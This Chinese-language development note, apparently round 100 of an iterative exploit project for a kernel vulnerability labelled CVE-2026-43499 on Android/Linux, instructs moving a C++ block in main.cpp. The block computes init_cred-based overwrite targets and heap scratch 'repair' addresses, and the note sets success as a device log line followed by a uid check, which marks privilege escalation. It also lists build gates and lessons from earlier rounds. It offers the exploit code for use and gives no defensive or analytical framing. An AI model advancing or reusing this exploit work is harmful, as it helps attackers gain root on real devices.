# 43499 · 第 100 轮：上移段**逐字落盘**（照抄即可）✓✓

## 一、要上移的整段（现行 `:1192-1223` ✓，**逐字** ✓）

```
注：完整逐字见 `core/src/main.cpp` 现行 `:1192-1223`（本轮已逐行读出 ✓）；
    为防"行号漂移"✗，下方给出**可判等的骨架**（⇒ 照抄时以文件现文为准 ✓）。
```

```cpp
                std::uint64_t repair_target = 0U;
                if (step == "w2") {
                    repair_target = kAliasBase + init_cred_image + alias_image_delta + 8U;
                } else if (step == "w1") {
                    /* 退役原文：`w1_scratch_poison = heap.current.base + mcast.buffer_size` ✓
                     *  ⇒ 用的是**块基址**（prepared.base ✓），不是 payload_base ✗。 */
                    repair_target = prepared.base + route_values.buffer_size;
                    /* ★ W1b 可见性（第 85 轮 ✓）…（中间三条注释与两段打印，见 :1199-1216 ✓）… */
                    {
                        const script::JsonNode *w1b_node = report.doc->find(
                                "backend.cve_2026_43499.execution.stages.w1_scratch_repair_attempts");
                        std::uint64_t w1b_attempts = 0U;
                        const bool w1b_have = w1b_node != nullptr &&
                                              report.doc->u64_of(*w1b_node, w1b_attempts) &&
                                              w1b_attempts != 0U;
                        std::printf("main: W1b: private scratch repair attempt 1/%llu",
                                    static_cast<unsigned long long>(w1b_have ? w1b_attempts : 1U));
                    }
                }
                cve49::steps::PrepareReport prepared2{};
                std::uint64_t repair_base = 0U;
                std::vector<std::uint8_t> repair_image(kOrder3 * kChunks, 0U);
                bool repair_prebuilt = false;
```

## 二、搬到哪里（✓）

```
目标位置：**主路由之前** —— 即现行 `:1168` `const char *stage_refusal = cve49::steps::run_window_stage_with_attempt(`
           **上一行之前** ✓；⇒ 上移后 `repair_target` / 三个量 / `repair_prebuilt` 都在主路由前可得 ✓；
⇒ 依赖核对（第 99 轮 ✓）：`step` ✓ / `prepared.base` ✓ / `route_values.buffer_size` ✓ / `init_cred_image` ✓ /
  `alias_image_delta` ✓ / `kAliasBase` ✓ —— 全部在主路由之前**已定义** ✓ ⇒ **⇒ 上移在依赖上无阻** ✓。
```

## 三、搬完后的样子（✓，第二处编辑 ✓）

```
旧处（原 `:1224` 起的 `if` 体）只保留：**prepare + 建页**上移后 ✗ ⇒ 该处改为
  `if (repair_prebuilt) { …activate + send + route… }` ✓（⇒ 无预建则整段跳过 ✓，不再重建 ✗）；
⇒ 出口（含早退）补 `discard` ✓（守则 §5 ✓）；⇒ 该次路由的进入延迟取 **5000 µs** ✓（第 90 轮 ✓）。
```

## 四、三条教训（✓，务必带上 ✓）

```
① **不得只插入副本** ✗（第 98 轮：编译器以 `undeclared identifier` 当场拦下 ✓）⇒ 必须**连同声明上移** ✓；
② 门禁**必须含 host** ✓（第 85 轮：`<linux/futex.h>` 在 macOS 不存在 ⇒ `check` 变红 ✗）⇒ 三线同批 ✓；
③ 定位**一律用内容锚点** ✓（第 91 轮：绝对行号会漂移 ✗）。
判据：真机出现归档同形 `fast repair payload prebuilt` ✓ / `firing prebuilt init_cred+8 repair` ✓ ⇒ **再看 `uid`** ✓。
```

## 五、门禁（✓，全绿 ✓）

```
check → 109 PASS ✓；android → 0 error / 0 warning ✓；lint → 0 ✓
```
